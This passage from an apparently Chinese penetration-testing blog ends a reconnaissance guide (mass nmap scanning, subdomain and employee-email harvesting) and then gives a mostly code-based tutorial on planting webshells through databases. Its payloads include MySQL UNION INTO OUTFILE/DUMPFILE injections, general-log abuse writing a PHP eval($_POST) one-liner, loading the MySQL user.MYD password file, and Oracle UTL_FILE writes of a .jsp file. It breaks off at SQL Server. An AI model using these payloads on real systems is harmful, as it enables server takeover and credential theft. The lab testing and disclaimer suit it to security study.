<code>-</code> 前缀，以排除该限定符匹配的所有结果。</p><table><thead><tr><th align="left">查询</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><code>-*QUALIFIER</code></td><td align="left"><strong><a href="https://github.com/search?q=cats+stars:%3E10+-language:javascript&type=Repositories">cats stars:&gt;10 -language:javascript</a></strong> 匹配含有 “cats” 字样、有超过 10 个星号但并非以 JavaScript 编写的仓库。</td></tr><tr><td align="left"></td><td align="left"><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=mentions:defunkt+-org:github&type=Issues">mentions:defunkt -org:github</a></strong> 匹配提及 @defunkt 且不在 GitHub 组织仓库中的议题</td></tr></tbody></table><h4 id="有空格的查询需使用引号"><a href="#有空格的查询需使用引号" class="headerlink" title="有空格的查询需使用引号"></a>有空格的查询需使用引号</h4><p>如果搜索含有空格的查询，您需要用引号将其括起来。 例如：</p><ul><li><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+NOT+%22hello+world%22&type=Repositories">cats NOT “hello world”</a> 匹配含有 “cats” 字样但不含有 “hello world” 字样的仓库。</li></ul><h4 id="包含运算符"><a href="#包含运算符" class="headerlink" title="包含运算符"></a>包含运算符</h4><table><thead><tr><th align="left">查询</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><code> in:file</code></td><td align="left"><code>cats in:file</code> 搜索文件中包含cats的代码</td></tr><tr><td align="left"><code>in:path</code></td><td align="left"><code>cats in:path</code> 搜索路径中包含cats的代码。<code>cats in:path,file</code> 搜索路径、文件中包含cats的代码</td></tr></tbody></table><h4 id="关键字总结"><a href="#关键字总结" class="headerlink" title="关键字总结"></a>关键字总结</h4><p><strong>pushed</strong>：在push中的代码中查找</p><p><strong>created</strong>：基于创建时间查找</p><p><strong>stars</strong>：基于star数量查找</p><p><strong>topics</strong>：基于标签数查找</p><p><strong>size</strong>：基于仓库文件数大小查找</p><p><strong>language</strong>：基于语言查找</p><p><strong>user</strong>：基于用户名查找</p><p><strong>org</strong>：基于组织搜索</p><p><strong>in</strong>：包含搜索</p><p><strong>repo</strong>：指定仓库搜索  <code>repo:USERNAME/REPOSITORY</code></p><p><strong>filename</strong>：基于文件名查找</p><p><strong>path</strong>：指定路径搜索 <code>cats path:app/public language:javascript </code> 搜索关键字cats，且语言为javascript，在app/public下的代码</p><p><strong>extension</strong>：指定扩展名搜索 <code>extension:properties jdbc</code></p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>只能搜索小于384 KB的文件。</li><li>不支持长度超过 256 个字符的查询</li><li>您无法使用超过五个 <code>AND</code>、<code>OR</code> 或 <code>NOT</code> 运算符构造查询</li><li>只能搜索少于500,000个文件的存储库。</li><li>登录的用户可以搜索所有公共存储库。</li><li>除<code>filename</code>搜索外，搜索源代码时必须至少包含一个搜索词。例如，搜索<code>language:javascript</code>无效，而是这样：<code>amazing language:javascript</code>。</li><li>搜索结果最多可以显示来自同一文件的两个片段，但文件中可能会有更多结果。</li><li>您不能将以下通配符用作搜索查询的一部分：<code>. , : ; / \ &#39; &quot; = * ! ? # $ &amp; + ^ | ~ &lt; &gt; ( ) &#123; &#125; [ ]</code>。搜索将忽略这些符号。</li></ul><h2 id="搜索引擎搜索"><a href="#搜索引擎搜索" class="headerlink" title="搜索引擎搜索"></a>搜索引擎搜索</h2><p>这个就那几个语法，大家应该都会。</p><h2 id="APP收集"><a href="#APP收集" class="headerlink" title="APP收集"></a>APP收集</h2><h3 id="安卓"><a href="#安卓" class="headerlink" title="安卓"></a>安卓</h3><p>可以通过各大APP商店来搜索</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GooglePlay商店:https:&#x2F;&#x2F;developer.android.google.cn</span><br><span class="line">小米应用商店:http:&#x2F;&#x2F;app.mi.com&#x2F;</span><br><span class="line">豌豆荚:https:&#x2F;&#x2F;www.wandoujia.com&#x2F;</span><br><span class="line">豆瓣:https:&#x2F;&#x2F;www.douban.com&#x2F;app&#x2F;search</span><br><span class="line">华为应用市场:https:&#x2F;&#x2F;appgallery1.huawei.com</span><br><span class="line">360手机助手:http:&#x2F;&#x2F;zhushou.360.cn&#x2F;</span><br><span class="line">腾讯应用宝:http:&#x2F;&#x2F;android.myapp.com&#x2F;</span><br><span class="line">百度手机助手:https:&#x2F;&#x2F;sj.qq.com&#x2F;</span><br><span class="line">OPPO软件商店:https:&#x2F;&#x2F;store.oppomobile.com&#x2F;</span><br><span class="line">VIVO应用商店:https:&#x2F;&#x2F;dev.vivo.com.cn&#x2F;distribute&#x2F;appStore</span><br><span class="line">搜狗手机助手:http:&#x2F;&#x2F;zhushou.sogou.com&#x2F;</span><br><span class="line">PP助手:https:&#x2F;&#x2F;www.25pp.com&#x2F;android&#x2F;</span><br><span class="line">魅族应用中心: http:&#x2F;&#x2F;app.meizu.com&#x2F;</span><br><span class="line">乐商店:https:&#x2F;&#x2F;www.lenovomm.com&#x2F;</span><br><span class="line">安卓市场:http:&#x2F;&#x2F;apk.hiapk.com&#x2F;</span><br></pre></td></tr></table></figure><h3 id="IOS"><a href="#IOS" class="headerlink" title="IOS"></a>IOS</h3><p>直接在AppStore上搜索，这里有一个小技巧可以用在搜索上，如果安卓商店也有的话也能适用，这边就拿酷狗来试验</p><img src="https://github.com/Ascotbe/Random-img/blob/master/InformationGathering/1.png?raw=true" alt="image-20200724172826427" style="zoom: 25%;" /><p>可以看到我们点进去这个APP后这是这样的，但是你们发现这边有一个开发者位置了吗</p><p>点击这个开发者按钮</p><img src="https://github.com/Ascotbe/Random-img/blob/master/InformationGathering/2.png?raw=true" alt="image-20200724172949944" style="zoom:25%;" /><p>我们可以看到旗下的APP全在这边了是不是很方便，有些还会有子公司的APP在里面，比如子公司<strong>广州繁星互娱信息科技有限公司</strong>，然后依旧点进去开发者里面</p><img src="https://github.com/Ascotbe/Random-img/blob/master/InformationGathering/3.png?raw=true" alt="image-20200724173222756" style="zoom:25%;" /><p>是不是发现又多了好多APP</p><img src="https://github.com/Ascotbe/Random-img/blob/master/InformationGathering/4.png?raw=true" alt="image-20200724173330399" style="zoom:25%;" /><h2 id="公众号-amp-小程序收集"><a href="#公众号-amp-小程序收集" class="headerlink" title="公众号&amp;小程序收集"></a>公众号&amp;小程序收集</h2><p>这个方法就不一一举例了</p><p>微信：通过搜索来查小程序和公众号</p><p>支付宝：可以通过支付宝来搞一波看下有没有小程序</p><h2 id="公司信息收集"><a href="#公司信息收集" class="headerlink" title="公司信息收集"></a>公司信息收集</h2><p>有些人会问为啥要查询这些信息啊，公司信息和渗透有毛关系，因为有些子公司也会用母公司的API以及数据库之类的，但是子公司的安全意识不一定强，我们渗透不能头铁要找软柿子捏</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">企查查：https:&#x2F;&#x2F;www.qcc.com&#x2F;</span><br><span class="line">天眼查：https:&#x2F;&#x2F;www.tianyancha.com&#x2F;</span><br><span class="line">启信宝：https:&#x2F;&#x2F;www.qixin.com&#x2F;</span><br><span class="line">企查猫：https:&#x2F;&#x2F;www.qichamao.com&#x2F;</span><br><span class="line">神眼查：https:&#x2F;&#x2F;www.shenyancha.com&#x2F;</span><br></pre></td></tr></table></figure><p>这边就列举这几个，正常查询差不多不会有漏下的了，接下来就是把子公司的域名啥的搜集起来用工具跑子域名了</p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p>一些好的子域名收集项目，这几个目前我用起来还不错，其他的一些子域名项目好多都是几年没更新了，害</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shmilylty&#x2F;OneForAll</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;laramies&#x2F;theHarvester</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r</span><br></pre></td></tr></table></figure><h2 id="端口收集"><a href="#端口收集" class="headerlink" title="端口收集"></a>端口收集</h2><p>收集完子域名就可以批量扫描一波端口了</p><p>当需要扫描B端之类的IP的时候，创建一个文件<code>ip.txt</code>然后里面填IP段，运行下面的代码直接起飞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -Pn -n --min-hostgroup 500 --min-parallelism 2048 --host-timeout 30 -T4 -v -p 20,21,22,23,80,161,389,443,873,1025,1099,2222,2601,2604,3312,3311,4440,5900,5901,5902,7002,9000,9200,10000,50000,50060,50030,8080,139,445,3389,13389,7001,1521,3306,1433,5000,5432,27017,6379,11211,53,389 -iL ip.txt &gt;&gt; result.txt</span><br></pre></td></tr></table></figure><p>提取数据的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&quot;2.txt&quot;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">lines = f.readlines()</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result1 = re.findall(<span class="string">r&#x27;Discovered open port (.*)/tcp&#x27;</span>, line)</span><br><span class="line">        result2 = re.findall(<span class="string">r&#x27;/tcp on (.*)&#x27;</span>, line)</span><br><span class="line">        print(result2[<span class="number">0</span>]+<span class="string">&quot;:&quot;</span>+result1[<span class="number">0</span>])</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">        f2.write(result2[<span class="number">0</span>]+<span class="string">&quot;:&quot;</span>+result1[<span class="number">0</span>]+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;提取数：&quot;</span>+<span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure><h2 id="员工邮箱收集"><a href="#员工邮箱收集" class="headerlink" title="员工邮箱收集"></a>员工邮箱收集</h2><p>进过我们上面的一大波收集信息，我们可以知道的前置信息</p><ul><li>C段中哪些IP的对应的端口是邮箱</li><li>子域名是邮箱地址</li></ul><p>如果以上方式都没有收集到我们需要的邮箱的地址的话，那我们还有办法（方法不全，主要是因为这个不常用</p><h3 id="利用一些网站来搜索"><a href="#利用一些网站来搜索" class="headerlink" title="利用一些网站来搜索"></a>利用一些网站来搜索</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;部分免费</span><br><span class="line">https:&#x2F;&#x2F;hunter.io</span><br><span class="line">&#x2F;&#x2F;部分免费</span><br><span class="line">http:&#x2F;&#x2F;www.skymem.info</span><br><span class="line">&#x2F;&#x2F;这个网站免费</span><br><span class="line">https:&#x2F;&#x2F;www.email-format.com&#x2F;i&#x2F;search&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/InformationGathering/6.png?raw=true" alt="image-20200725131737949"></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/InformationGathering/6.png?raw=true" alt="image-20200725130658393"></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/InformationGathering/7.png?raw=true" alt="image-20200725130959273"></p><p>接下来是开源项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;laramies&#x2F;theHarvester</span><br></pre></td></tr></table></figure><p>这项目还挺不错的，直接输入域名然后写入到html文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 theHarvester.py -d xxxxx.com -l 2000 -b all -f test.html</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/InformationGathering/9.png?raw=true" alt="image-20200725162758219"></p><h3 id="查看邮箱是否再用"><a href="#查看邮箱是否再用" class="headerlink" title="查看邮箱是否再用"></a>查看邮箱是否再用</h3><p>有时候有可能目标员工离职了之类的话，这个邮箱可能有不能使用了，那么我们可以用这个网站来进行测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mailtester.com&#x2F;testmail.php</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/InformationGathering/8.png?raw=true" alt="image-20200725143449599"></p><p>或者写个批量脚本批量跑</p><p>参考文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.github.com&#x2F;cn&#x2F;github&#x2F;searching-for-information-on-github&#x2F;understanding-the-search-syntax</span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzAwMzYxNzc1OA&#x3D;&#x3D;&amp;mid&#x3D;2247483886&amp;idx&#x3D;1&amp;sn&#x3D;4c98836e278737054a2d32416007fa27&amp;chksm&#x3D;9b39275fac4eae490e0c5ca5f90887aa3b8a441f137d18d3b73470ba46577b41ea3a9cfa1342&amp;mpshare&#x3D;1&amp;scene&#x3D;1&amp;srcid&#x3D;0724A6jortzlAN8nrOPDkXZV&amp;sharer_sharetime&#x3D;1595586201150&amp;sharer_shareid&#x3D;de4f8e5a5ad7bd6a89317b77fa1ff085#rd</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>常见数据库写入Webshell汇总</title>
    <link href="https://www.ascotbe.com/2020/07/21/DatabaseWriteWebshell/"/>
    <id>https://www.ascotbe.com/2020/07/21/DatabaseWriteWebshell/</id>
    <published>2020-07-21T13:45:42.000Z</published>
    <updated>2021-05-04T06:03:28.416Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>依旧是之前面试被毒打的问题，没玩过就玩一遍吧，目前只写了常见的3个数据库，如果后面又遇到其他的数据库在添加。</p><h2 id="MySql数据库"><a href="#MySql数据库" class="headerlink" title="MySql数据库"></a>MySql数据库</h2><p>前提条件</p><ul><li><p>数据库当前用户为root权限</p></li><li><p>知道当前网站的绝对路径</p></li><li><p>PHP的GPC为 off状态</p></li><li><p>写入的那个路径存在写入权限</p></li></ul><p>注意点：</p><blockquote><p>secure_file_priv参数说明</p></blockquote><p>这个参数用来限制数据导入和导出操作的效果，例如执行LOAD DATA、SELECT … INTO OUTFILE语句和LOAD_FILE()函数。</p><ul><li><p>如果这个参数为空，这个变量没有效果</p></li><li><p>如果这个参数设为一个目录名，MySQL服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它</p></li><li><p>如果这个参数为NULL，MySQL服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入</p></li></ul><p>如果遇到以下情况的话，使用SQL语句中的<code>outfile</code>是无法成功的，但是写入日志的方法是可以成功的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/1.png?raw=true" alt="image-20200721163145745"></p><blockquote><p>开启secure_file_priv</p></blockquote><p>修改<strong>my.ini</strong>文件后需要重启MySql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv为NULL禁止导出文件secure_file_priv&#x3D;&quot;&quot;</span><br><span class="line">secure_file_priv指定地址限制导出地址只能在此secure_file_priv&#x3D;“D:&#x2F;”</span><br><span class="line">secure_file_priv为空可以导出到任意文件secure_file_priv&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/2.png?raw=true" alt="image-20200721164643432"></p><blockquote><p>查看是否有写入权限</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(user,0x3a,file_priv) from mysql.user;</span><br><span class="line">出现Y，这就代表你有文件权限，N就是没有</span><br></pre></td></tr></table></figure><h3 id="基于联合查询"><a href="#基于联合查询" class="headerlink" title="基于联合查询"></a>基于联合查询</h3><p>注入点位置如下，后面使用的话会省略这段值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;Less-2&#x2F;?id&#x3D;1 </span><br></pre></td></tr></table></figure><p>利用outfile方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION ALL SELECT 1,2,&quot;&lt;? phpinfo(); ?&gt;&quot; into outfile &quot;C:\\phpStudy\\PHPTutorial\\WWW\\test\123.txt&quot; -- </span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/3.png?raw=true" alt="image-20200721182619518"></p><p>可以发现写入成功了，值得注意的是我们写入的是在test目录和123.txt中间没有用双斜杠，这样写入的文件会被过滤了，直接写到了WWW目录而不是test目录里面</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/4.png?raw=true" alt="image-20200721182654445"></p><p>利用dumpfile方法，这种方法可以写入16进制数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION ALL SELECT 1,2,&quot;&lt;? phpinfo(); ?&gt;&quot; into dumpfile &quot;C:\\phpStudy\\PHPTutorial\\WWW\\test\123.txt&quot; --</span><br></pre></td></tr></table></figure><p>写入普通数据</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/5.png?raw=true" alt="image-20200721183121847"></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/6.png?raw=true" alt="image-20200721183134285"></p><p>把PHP内容写成16进制编码数据在写入</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/7.png?raw=true" alt="image-20200721183645338"></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/8.png?raw=true" alt="image-20200721183709153"></p><h3 id="基于非联合查询"><a href="#基于非联合查询" class="headerlink" title="基于非联合查询"></a>基于非联合查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">into outfile &quot;C:\\phpStudy\\PHPTutorial\\WWW\\123.txt&quot; fields terminated by &quot;&lt;? phpinfo(); ?&gt;&quot; %23 --</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/15.png?raw=true" alt="image-20200722114910448"></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/16.png?raw=true" alt="image-20200722114926885"></p><h3 id="基于log日志写shell法"><a href="#基于log日志写shell法" class="headerlink" title="基于log日志写shell法"></a>基于log日志写shell法</h3><p>先看看当前mysql下log日志的默认地址，同时也看下log日志是否为开启状态，记下来后面需要改回来的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%general%&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/9.png?raw=true" alt="image-20200721145256729"></p><p>然后开启日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; on;</span><br></pre></td></tr></table></figure><p>设置日志写入位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file &#x3D; &#39;C:&#x2F;2.txt&#39;;</span><br></pre></td></tr></table></figure><p>写入日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[&#39;ascotbe&#39;]);?&gt;&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/10.png?raw=true" alt="image-20200721150323748"></p><p>修改为原来的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file&#x3D;&#39;c:&#x2F;xxxxx&#x2F;xxxx&#39;</span><br></pre></td></tr></table></figure><p>关闭日志记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; off;</span><br></pre></td></tr></table></figure><h3 id="基于创建再导出的方法"><a href="#基于创建再导出的方法" class="headerlink" title="基于创建再导出的方法"></a>基于创建再导出的方法</h3><p>连接test数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use test;</span><br></pre></td></tr></table></figure><p>搜索并删除存在的<strong>ascotbe</strong>这个表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table if exists ascotbe;</span><br></pre></td></tr></table></figure><p>创建这个表，在里边加个字段xxx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table ascotbe(xxx text not null);</span><br></pre></td></tr></table></figure><p>在里面写入一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into ascotbe(xxx) values (&#39;&lt;?php phpinfo(); ?&gt;&#39;);</span><br></pre></td></tr></table></figure><p>然后把这句话导出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT xxx FROM ascotbe INTO OUTFILE &#39;D:&#x2F;2.txt&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/11.png?raw=true" alt="image-20200721165110113"></p><p>然后删除表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE ascotbe;</span><br></pre></td></tr></table></figure><h3 id="低权限利用"><a href="#低权限利用" class="headerlink" title="低权限利用"></a>低权限利用</h3><p>如果你发现一个注入点，但是这个注入点只是一个普通权限没法写 shell </p><p>利用条件：</p><ul><li><p>知道一个数据库用户账密</p></li><li><p>能进入到 phpmyadmin 下</p></li><li><p>一些默认文件路径位置没有更改</p></li></ul><p> 首先查看日志是否开启，然后看看日志文件路径根据这个路径推算出默认的<strong>user.MYD</strong>路径。一般默认的位置都是在 Mysql\data\mysql\user.MYD 这个路径下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%general%&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/12.png?raw=true" alt="image-20200721170600378"></p><p>然后把密码的文件导入到表里面，这边插入的表为<strong>ascotbe</strong>，这边有个点需要注意下导入文件的位置需要用<code>\</code>可能会报错，需要替换成<code>/</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD DATA LOCAL INFILE &#39;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;MySQL&#x2F;data&#x2F;mysql&#x2F;user.MYD&#39; INTO TABLE ascotbe FIELDS TERMINATED BY &#39;&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/13.png?raw=true" alt="image-20200721171534970"></p><p>可以看到导入成功</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/14.png?raw=true" alt="image-20200721171817802"></p><h2 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h2><p>首先是搭建环境，这边选着docker搭建，搭建好直接用navicat连接</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/17.png?raw=true" alt="image-20200722162047188"></p><p>这边测试使用的是DBA权限中的system账户</p><h3 id="利用文件访问包写shell"><a href="#利用文件访问包写shell" class="headerlink" title="利用文件访问包写shell"></a>利用文件访问包写shell</h3><p>首先创建我们得先建立一个ORACLE的目录对象指向<strong>XXXX</strong>，这边测试指向的路径为**/home/oracle**</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create or replace directory IST0_DIR as &#39;&#x2F;home&#x2F;oracle&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/18.png?raw=true" alt="image-20200722163209851"></p><p>我们查看docker的路径，以及路径下的内容</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/19.png?raw=true" alt="image-20200722163036270"></p><p>如果后面写入失败了可以执行这条命令对这个目录进行授权下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant read, write on directory IST0_DIR to system;</span><br></pre></td></tr></table></figure><p>然后写入文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">declare</span><br><span class="line">   isto_file utl_file.file_type; --定义变量的类型为utl_file.file_type</span><br><span class="line">begin</span><br><span class="line">   isto_file :&#x3D; utl_file.fopen(&#39;IST0_DIR&#39;, &#39;ascotbe.jsp&#39;, &#39;W&#39;); --指定为IST0_DIR 目录下面的kj021320.jsp文件写操作</span><br><span class="line">   utl_file.put_line(isto_file, &#39;这是一个一句话webshell&#39;); --写入字符串</span><br><span class="line">   utl_file.fflush(isto_file); --刷缓冲</span><br><span class="line">   utl_file.fclose(isto_file); --关闭文件指针</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><p>执行成功</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/20.png?raw=true" alt="image-20200722163418044"></p><p>可以发现写入了shell</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/21.png?raw=true" alt="image-20200722163501324"></p><p>如果是真实环境的话我们并不能连接服务器，这样我们怎么知道shell是否写入成功呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">declare</span><br><span class="line">   isto_file utl_file.file_type; --如上</span><br><span class="line">   fp_buffer varchar2(4000); --没必要说了吧？</span><br><span class="line">begin</span><br><span class="line">   isto_file :&#x3D; utl_file.fopen(&#39;IST0_DIR&#39;, &#39;ascotbe.jsp&#39;, &#39;R&#39;); -- 指定为读操作</span><br><span class="line">   utl_file.get_line (isto_file , fp_buffer ); --读取一行放到  fp_buffer 变量里面</span><br><span class="line">   dbms_output.put_line(fp_buffer);--在终端输出结果看看</span><br><span class="line">   utl_file.fclose(isto_file); --关闭文件指针</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><p>执行即可读取我们写入的文件内容了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/22.png?raw=true" alt="image-20200722163711282"></p><h2 id="SqlServer数据库"><a href="#SqlServer数据库" class="headerlink" title="SqlServer数据库"></a>SqlServer数据库</h2><p>首先搭建环境，当前使用的环境是<strong>SQL Server 